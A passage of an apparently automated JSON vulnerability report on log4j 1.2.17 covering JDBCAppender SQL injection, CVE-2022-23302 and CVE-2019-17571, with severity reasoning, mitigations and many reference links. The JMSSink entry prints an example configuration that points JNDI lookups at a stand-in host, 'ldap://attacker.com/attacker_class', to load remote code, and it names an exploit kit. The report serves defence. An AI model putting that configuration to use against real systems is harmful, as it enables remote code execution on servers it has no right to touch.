encoding=\"UTF-8\"?\u003e\n\u003cConfiguration\u003e\n\t\u003cAppenders\u003e\n\t\t\u003cJDBC name=\"dbLogsStore\" tableName=\"EVENT_LOGS\"\u003e\t\t\t\n\t\t\t\u003cConnectionFactory class=\"com.demo.jdbcappender.LogsStoreConnectionFactory\" method=\"getConnection\" /\u003e\n\t\t\t\u003cColumn name=\"ID\" pattern=\"%u\" /\u003e\n\t\t\t\u003cColumn name=\"DATE_TIME\" isEventTimestamp=\"true\" /\u003e\n\t\t\t\u003cColumn name=\"CLASS\" pattern=\"%logger\" /\u003e\n\t\t\t\u003cColumn name=\"LEVEL\" pattern=\"%level\" /\u003e\n\t\t\t\u003cColumn name=\"MESSAGE\" pattern=\"%message\" /\u003e\n\t\t\t\u003cColumn name=\"EXCEPTION\" pattern=\"%ex{full}\" isClob=\"true\"/\u003e\n\t\t\u003c/JDBC\u003e\n\t\u003c/Appenders\u003e\n\u003c/Configuration\u003e\n```",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find a remote service that logs an attacker-controlled input using the Log4j API. In addition, the  Log4j application needs to be specifically configured to use `JDBCAppender`, which is not enabled by default (see a vulnerable configuration example in \"Full Description\")",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that if the application uses Log4j to log anything, the log will contain some external input."
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "SQL Injection"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nPossible mitigations for the vulnerability:\n1. Comment out or remove JDBCAppender in the Log4j configuration if it's used.\n2. Remove the JDBCAppender class from the server's jar files. For example:\n    zip -q -d log4j-*.jar org/apache/log4j/jdbc/JDBCAppender.class"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-23302",
            "cvss_v2_score": "6.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:S/C:P/I:P/A:P",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "JMSSink in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a TopicConnectionFactoryBindingName configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-4104. Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is not the default. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.",
        "severity": "High",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-194907",
        "references": [
          "https://www.vicarius.io/vsociety/posts/cve-2022-23302-mitigate-log4j-1217-vulnerability",
          "https://www.vicarius.io/vsociety/posts/cve-2022-23302-detect-log4j-1217-vulnerability",
          "https://github.com/advisories/GHSA-w9p3-5cr8-m3jj",
          "http://www.openwall.com/lists/oss-security/2022/01/18/3",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-23302",
          "https://logging.apache.org/log4j/1.2/index.html",
          "https://security.netapp.com/advisory/ntap-20220217-0006/",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://security.netapp.com/advisory/ntap-20220217-0006",
          "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
        ],
        "extended_information": {
          "short_description": "JNDI lookup in JMSSink component in Log4j leads to Java code injection when attackers can control the Log4j configuration file.",
          "full_description": "[JMSSink](https://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/net/JMSSink.html) is a simple application in Apache Log4j server that consumes logging events.\n\nDeserialization of untrusted data vulnerability has been discovered in the JMSSink component which uses JNDI in an unprotected manner.\nJMSSink is run in a standalone manner, for example - \n```bash\njava -cp log4j.jar org.apache.log4j.net.JMSSink\n```\n\nAn attacker can exploit this vulnerability by providing a crafted `TopicConnectionFactoryBindingName` value in the Log4j configuration file, that causes JMSSink to perform JNDI requests that result in remote code execution, for example -\n```\nlog4j.appender.jms=org.apache.log4j.net.JMSAppender\nlog4j.appender.jms.InitialContextFactoryName=org.apache.activemq.jndi.ActiveMQInitialContextFactory\nlog4j.appender.jms.ProviderURL=tcp://localhost:61616\n\u003e\u003e\u003elog4j.appender.jms.TopicBindingName=ldap://attacker.com/attacker_class\n\u003e\u003e\u003elog4j.appender.jms.TopicConnectionFactoryBindingName=ldap://attacker.com/attacker_class\n```\n\nThe vulnerability is highly unlikely to be exploitable since -\n1. The attacker must be able to control the Log4j configuration file, which is extremely unlikely\n2. The JMSSink application must be executed",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "Exploiting the issue can be done using popular projects such as [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The vulnerability is highly unlikely to be exploitable since -\n1. The attacker must be able to control the Log4j configuration file, which is extremely unlikely\n2. The JMSSink application must be executed",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove the JMSSink class from the server's jar files. For example -\n```bash\nzip -q -d log4j-*.jar org/apache/log4j/net/JMSSink.class\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-17571",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data. This affects Log4j versions up to 1.2 up to 1.2.17.",
        "severity": "Critical",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-93075",
        "references": [
          "https://lists.apache.org/thread.html/r1b7734dfdfd938640f2f5fb6f4231a267145c71ed60cc7faa1cbac07@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rd3a9511eebab60e23f224841390a3f8cd5358cff605c5f7042171e47%40%3Cdev.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/r90c23eb8c82835fa82df85ae5e88c81fd9241e20a22971b0fb8f2c34%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r909b8e3a36913944d3b7bafe9635d4ca84f8f0e2cd146a1784f667c2%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rc17d8491beee51607693019857e41e769795366b85be00aa2f4b3159@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/re36da78e4f3955ba6c1c373a2ab85a4deb215ca74b85fcd66142fea1%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rfdf65fa675c64a64459817344e0e6c44d51ee264beea6e5851fb60dc@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6d34da5a0ca17ab08179a30c971446c7421af0e96f6d60867eabfc52@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rca24a281000fb681d7e26e5c031a21eb4b0593a7735f781b53dae4e2@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/re36da78e4f3955ba6c1c373a2ab85a4deb215ca74b85fcd66142fea1@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d666e4e8905157f3c046d31398b04f2bfd4519e31f266de108c6919@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rd6254837403e8cbfc7018baa9be29705f3f06bd007c83708f9a97679@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7a1acc95373105169bd44df710c2f462cad31fb805364d2958a5ee03@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r7a1acc95373105169bd44df710c2f462cad31fb805364d2958a5ee03%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r9fb3238cfc3222f2392ca6517353aadae18f76866157318ac562e706@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc45eb0f53fd6242af3e666c2189464f848a851d408289840cecc6e3@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdec0d8ac1f03e6905b0de2df1d5fcdb98b94556e4f6cccf7519fdb26@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r746fbc3fc13aee292ae6851f7a5080f592fa3a67b983c6887cdb1fc5@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r8d78a0fbb56d505461e29868d1026e98c402e6a568c13a6da67896a2%40%3Cdev.jena.apache.org%3E",
          "https://lists.apache.org/thread.html/r6aec6b8f70167fa325fb98b3b5c9ce0ffaed026e697b69b85ac24628@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r13d4b5c60ff63f3c4fab51d6ff266655be503b8a1884e2f2fab67c3a%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r05755112a8c164abc1004bb44f198b1e3d8ca3d546a8f13ebd3aa05f%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdb7ddf28807e27c7801f6e56a0dfb31092d34c61bdd4fa2de9182119%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r71e26f9c2d5826c6f95ad60f7d052d75e1e70b0d2dd853db6fc26d5f%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r05755112a8c164abc1004bb44f198b1e3d8ca3d546a8f13ebd3aa05f@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf77f79699c8d7e430c14cf480f12ed1297e6e8cf2ed379a425941e80%40%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/rd882ab6b642fe59cbbe94dc02bd197342058208f482e57b537940a4b%40%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/r90c23eb8c82835fa82df85ae5e88c81fd9241e20a22971b0fb8f2c34@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2ff63f210842a3c5e42f03a35d8f3a345134d073c80a04077341c211@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r52a5129df402352adc34d052bab9234c8ef63596306506a89fdc7328@%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r3a85514a518f3080ab1fc2652cfe122c2ccf67cfb32356acb1b08fe8@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/rb1b29aee737e1c37fe1d48528cb0febac4f5deed51f5412e6fdfe2bf@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rf53eeefb7e7e524deaacb9f8671cbf01b8a253e865fb94e7656722c0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rcd71280585425dad7e232f239c5709e425efdd0d3de4a92f808a4767@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra9611a8431cb62369bce8909d7645597e1dd45c24b448836b1e54940%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9d2e28e71f91ba0b6f4114c8ecd96e2b1f7e0d06bdf8eb768c183aa9%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r681b4432d0605f327b68b9f8a42662993e699d04614de4851c35ffd1@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b45a2fcc8e98ac93a179183dbb7f340027bdb8e3ab393418076b153%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rc628307962ae1b8cc2d21b8e4b7dd6d7755b2dd52fa56a151a27e4fd%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3cf50d05ce8cec8c09392624b7bae750e7643dae60ef2438641ee015@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9d0d03f2e7d9e13c68b530f81d02b0fec33133edcf27330d8089fcfb%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra38785cfc0e7f17f8e24bebf775dd032c033fadcaea29e5bc9fffc60%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r3784834e80df2f284577a5596340fb84346c91a2dea6a073e65e3397@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/ra18a903f785aed9403aea38bc6f36844a056283c00dcfc6936b6318c@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/44491fb9cc19acc901f7cff34acb7376619f15638439416e3e14761c%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r189aaeaad897f7d6b96f7c43a8ef2dfb9f6e9f8c1cc9ad182ce9b9ae%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/752ec92cd1e334a639e79bfbd689a4ec2c6579ec5bb41b53ffdf358d@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8418a0dff1729f19cf1024937e23a2db4c0f94f2794a423f5c10e8e7@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r107c8737db39ec9ec4f4e7147b249e29be79170b9ef4b80528105a2d%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4b25538be50126194cc646836c718b1a4d8f71bd9c912af5b59134ad%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/re8c21ed9dd218c217d242ffa90778428e446b082b5e1c29f567e8374%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rbdf18e39428b5c80fc35113470198b1fe53b287a76a46b0f8780b5fd@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8c392ca48bb7e50754e4bc05865e9731b23d568d18a520fe3d8c1f75@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r48d5019bd42e0770f7e5351e420a63a41ff1f16924942442c6aff6a8@%3Ccommits.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8c392ca48bb7e50754e4bc05865e9731b23d568d18a520fe3d8c1f75%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc@%3Cdev.kafka.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/advisories/GHSA-2qrg-x229-3v8q",
          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772@%3Cdev.mina.apache.org%3E",
          "https://lists.apache.org/thread.html/rda4849c6823dd3e83c7a356eb883180811d5c28359fe46865fd151c3@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e3f7da12bf5750b0a02e69a78a61073a2ac950eed7451ce70a65177%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/6114ce566200d76e3cc45c521a62c2c5a4eac15738248f58a99f622c%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r3bf7b982dfa0779f8a71f843d2aa6b4184a53e6be7f149ee079387fd%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc17d8491beee51607693019857e41e769795366b85be00aa2f4b3159%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r61590890edcc64140e0c606954b29a063c3d08a2b41d447256d51a78%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r944183c871594fe9a555b8519a7c945bbcf6714d72461aa6c929028f%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8244fd0831db894d5e89911ded9c72196d395a90ae655414d23ed0dd@%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r6236b5f8646d48af8b66d5050f288304016840788e508c883356fe0e@%3Clog4j-user.logging.apache.org%3E",
          "https://lists.apache.org/thread.html/r2ce8d26154bea939536e6cf27ed02d3192bf5c5d04df885a80fe89b3%40%3Cissues.activemq.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-17571",
          "https://lists.apache.org/thread.html/564f03b4e9511fcba29c68fc0299372dadbdb002718fa8edcc4325e4@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf2567488cfc9212b42e34c6393cfa1c14e30e4838b98dda84d71041f%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r9d0d03f2e7d9e13c68b530f81d02b0fec33133edcf27330d8089fcfb@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf53eeefb7e7e524deaacb9f8671cbf01b8a253e865fb94e7656722c0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r52a5129df402352adc34d052bab9234c8ef63596306506a89fdc7328%40%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r7bcdc710857725c311b856c0b82cee6207178af5dcde1bd43d289826%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r13d4b5c60ff63f3c4fab51d6ff266655be503b8a1884e2f2fab67c3a@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r26244f9f7d9a8a27a092eb0b2a0ca9395e88fcde8b5edaeca7ce569c%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r9a9e3b42cd5d1c4536a14ef04f75048dec8e2740ac6a138ea912177f%40%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/r3cf50d05ce8cec8c09392624b7bae750e7643dae60ef2438641ee015%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3a85514a518f3080ab1fc2652cfe122c2ccf67cfb32356acb1b08fe8%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/ra54fa49be3e773d99ccc9c2a422311cf77e3ecd3b8594ee93043a6b1@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5dbeee4808c0f2b9b51479b50de3cc6adb1072c332a200d9107f13e@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf2a0d94c3b5b523aeff7741ae71347415276062811b687f30ea6573%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r26244f9f7d9a8a27a092eb0b2a0ca9395e88fcde8b5edaeca7ce569c@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r48d5019bd42e0770f7e5351e420a63a41ff1f16924942442c6aff6a8%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/ra54fa49be3e773d99ccc9c2a422311cf77e3ecd3b8594ee93043a6b1%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8244fd0831db894d5e89911ded9c72196d395a90ae655414d23ed0dd%40%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf2a0d94c3b5b523aeff7741ae71347415276062811b687f30ea6573@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/752ec92cd1e334a639e79bfbd689a4ec2c6579ec5bb41b53ffdf358d%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1b434e11834a4449cd7addb69ed0aef0923112b5938182b363a968c@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8890b8f18f1de821595792b58b968a89692a255bc20d86d395270740%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b7734dfdfd938640f2f5fb6f4231a267145c71ed60cc7faa1cbac07%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/564f03b4e9511fcba29c68fc0299372dadbdb002718fa8edcc4325e4%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6236b5f8646d48af8b66d5050f288304016840788e508c883356fe0e%40%3Clog4j-user.logging.apache.org%3E",
          "https://lists.apache.org/thread.html/rd882ab6b642fe59cbbe94dc02bd197342058208f482e57b537940a4b@%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/r3c575cabc7386e646fb12cb82b0b38ae5a6ade8a800f827107824495@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/277b4b5c2b0e06a825ccec565fa65bd671f35a4d58e3e2ec5d0618e1@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/rdec0d8ac1f03e6905b0de2df1d5fcdb98b94556e4f6cccf7519fdb26%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r696507338dd5f44efc23d98cafe30f217cf3ba78e77ed1324c7a5179@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r48efc7cb5aeb4e1f67aaa06fb4b5479a5635d12f07d0b93fc2d08809@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8e3f7da12bf5750b0a02e69a78a61073a2ac950eed7451ce70a65177@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4ac89cbecd9e298ae9fafb5afda6fa77ac75c78d1ac957837e066c4e%40%3Cuser.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8d78a0fbb56d505461e29868d1026e98c402e6a568c13a6da67896a2@%3Cdev.jena.apache.org%3E",
          "https://lists.apache.org/thread.html/r48efc7cb5aeb4e1f67aaa06fb4b5479a5635d12f07d0b93fc2d08809%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb3c94619728c8f8c176d8e175e0a1086ca737ecdfcd5a2214bb768bc@%3Ccommits.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf9c19bcc2f7a98a880fa3e3456c003d331812b55836b34ef648063c9%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r7bcdc710857725c311b856c0b82cee6207178af5dcde1bd43d289826@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r9fb3238cfc3222f2392ca6517353aadae18f76866157318ac562e706%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r3543ead2317dcd3306f69ee37b07dd383dbba6e2f47ff11eb55879ad%40%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rec34b1cccf907898e7cb36051ffac3ccf1ea89d0b261a2a3b3fb267f%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b45a2fcc8e98ac93a179183dbb7f340027bdb8e3ab393418076b153@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rbc45eb0f53fd6242af3e666c2189464f848a851d408289840cecc6e3%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf77f79699c8d7e430c14cf480f12ed1297e6e8cf2ed379a425941e80@%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/rd7805c1bf9388968508c6c8f84588773216e560055ddcc813d19f347@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1b434e11834a4449cd7addb69ed0aef0923112b5938182b363a968c%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb3c94619728c8f8c176d8e175e0a1086ca737ecdfcd5a2214bb768bc%40%3Ccommits.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r356d57d6225f91fdc30f8b0a2bed229d1ece55e16e552878c5fa809a%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9a9e3b42cd5d1c4536a14ef04f75048dec8e2740ac6a138ea912177f@%3Cpluto-dev.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/r5c084578b3e3b40bd903c9d9e525097421bcd88178e672f612102eb2@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/6114ce566200d76e3cc45c521a62c2c5a4eac15738248f58a99f622c@%3Cissues.activemq.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.apache.org/thread.html/rfdf65fa675c64a64459817344e0e6c44d51ee264beea6e5851fb60dc%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r7f462c69d5ded4c0223e014d95a3496690423c5f6f05c09e2f2a407a@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rec34b1cccf907898e7cb36051ffac3ccf1ea89d0b261a2a3b3fb267f@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2756fd570b6709d55a61831ca028405bcb3e312175a60bc5d911c81f@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r18f1c010b554a3a2d761e8ffffd8674fd4747bcbcf16c643d708318c@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rda4849c6823dd3e83c7a356eb883180811d5c28359fe46865fd151c3%40%3Cusers.kafka.apache.org%3E",
          "http://lists.opensuse.org/opensuse-security-announce/2020-01/msg00022.html",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r3bf7b982dfa0779f8a71f843d2aa6b4184a53e6be7f149ee079387fd@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/ra18a903f785aed9403aea38bc6f36844a056283c00dcfc6936b6318c%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r594411f4bddebaf48a4c70266d0b7849e0d82bb72826f61b3a35bba7@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rc1eaed7f7d774d5d02f66e49baced31e04827a1293d61a70bd003ca7@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/raedd12dc24412b3780432bf202a2618a21a727788543e5337a458ead@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/re8c21ed9dd218c217d242ffa90778428e446b082b5e1c29f567e8374@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r3543ead2317dcd3306f69ee37b07dd383dbba6e2f47ff11eb55879ad@%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r71e26f9c2d5826c6f95ad60f7d052d75e1e70b0d2dd853db6fc26d5f@%3Cjira.kafka.apache.org%3E",
